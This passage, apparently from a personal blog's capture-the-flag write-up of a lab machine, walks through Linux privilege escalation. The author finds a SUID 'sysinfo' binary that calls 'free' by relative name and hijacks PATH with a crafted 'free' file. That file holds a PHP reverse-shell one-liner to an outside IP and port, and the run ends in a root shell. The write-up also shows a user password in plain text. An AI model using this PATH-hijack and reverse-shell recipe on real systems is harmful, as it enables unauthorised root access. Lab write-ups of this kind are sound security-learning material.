<h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
<p>Now is time to scalate priveleges.</p>
<h3 id="sudo">Sudo</h3>
<p>Testing sudo:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ sudo -l
sudo -l
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> theseus: Th3s3usW4sK1ng

Sorry, user theseus may not run sudo on ubuntu.
</code></pre></div><p>No sudo allowed :(</p>
<h3 id="linenum-and-sysinfo">LinEnum and sysinfo</h3>
<p>I uploaded <em>LinEnum.sh</em> and i got this not standard binary on Linux:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-rwsr-x--- <span style="color:#ae81ff">1</span> root users <span style="color:#ae81ff">22040</span> Oct <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> /bin/sysinfo
</code></pre></div><p>Also theseus has this group:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/var/www/Magic/images/uploads$ id
id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>
theseus@ubuntu:/var/www/Magic/images/uploads$ groups
groups
theseus users
</code></pre></div><p>Checking what sysinfo does:</p>
<p><a href="https://www.binarytides.com/linux-commands-hardware-info/">https://www.binarytides.com/linux-commands-hardware-info/</a></p>
<p>Looks like is using standard Linux binaries to report hardware info I recognise the standard output of the command <em>free</em> and it is executed as root using a SUID bit because -rwsr.</p>
<p>Checking theseus path:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/var/www/Magic/images/uploads$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/var/www/Magic/images/uploads$ PATH<span style="color:#f92672">=</span>/tmp:$PATH
PATH<span style="color:#f92672">=</span>/tmp:$PATH
theseus@ubuntu:/var/www/Magic/images/uploads$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
</code></pre></div><p>Locating free</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ locate free | grep bin 
locate free | grep bin
/sbin/fsfreeze
/snap/core/7917/sbin/fsfreeze
/snap/core/7917/usr/bin/free
/snap/core/7917/usr/sbin/e2freefrag
/snap/core/8689/sbin/fsfreeze
/snap/core/8689/usr/bin/free
/snap/core/8689/usr/sbin/e2freefrag
/snap/core18/1223/sbin/fsfreeze
/snap/core18/1223/usr/bin/free
/snap/core18/1223/usr/sbin/e2freefrag
/snap/core18/1668/sbin/fsfreeze
/snap/core18/1668/usr/bin/free
/snap/core18/1668/usr/sbin/e2freefrag
/usr/bin/free
/usr/sbin/e2freefrag
</code></pre></div><p>Checking inside with <em>ltrace</em> I discovered it is not using the full path of the binary and is looking inside the user path var.</p>
<p>So it is vulnerable to alter the user path var.</p>
<h3 id="custom-binary-and-root">Custom binary and root</h3>
<p>I crafted a special &ldquo;free&rdquo; binary to make a reverse shell and I modifed the theseus var path to use the path <em>/tmp/bin</em> to force <em>sysinfo</em> to use my custom <em>free</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo ‚Äúphp -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.10.14.11&#34;,1338);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>‚Äù &gt; free
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp/bin$ chmod +s free
theseus@ubuntu:/tmp/bin$ chmod +x free
</code></pre></div><p>But did not work as expected, the reverse shell is not opened but executed the /bin/sh as root&hellip; and I got a working shell with root!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
theseus@ubuntu:/tmp/bin$ sysinfo
<span style="color:#f92672">====================</span>Hardware Info<span style="color:#f92672">====================</span>
H/W path           Device      Class      Description
<span style="color:#f92672">=====================================================</span>
	                       system     VMware Virtual Platform
/0                             bus        440BX Desktop Reference Platform
/0/0                           memory     86KiB BIOS
/0/1                           processor  AMD EPYC 7401P 24-Core Processor
/0/1/0                         memory     16KiB L1 cache
/0/1/1                         memory     16KiB L1 cache


<span style="color:#f92672">[</span>..<span style="color:#f92672">]</span>

TLB size        : <span style="color:#ae81ff">2560</span> 4K pages
clflush size    : <span style="color:#ae81ff">64</span>
cache_alignment : <span style="color:#ae81ff">64</span>
address sizes   : <span style="color:#ae81ff">43</span> bits physical, <span style="color:#ae81ff">48</span> bits virtual
power management:


<span style="color:#f92672">====================</span>MEM Usage<span style="color:#f92672">=====================</span>
<span style="color:#75715e"># ls</span>
ls
<span style="color:#75715e"># whoami</span>
root
<span style="color:#75715e"># cat /root/root.txt</span>
8bb<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>2b75

</code></pre></div><p>So my first approach of using a reverse shell with PHP, can be simplified to only open a shell as root.</p>
<p>Thanks for reading!</p>
</div>

  </article>
</main>
<footer>
  <div>
    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
    <div>¬© 2020 ‚Äî u915 ‚Äî <a href="/license/">License</a></div>
  </div>
</footer>
</body>
</html>
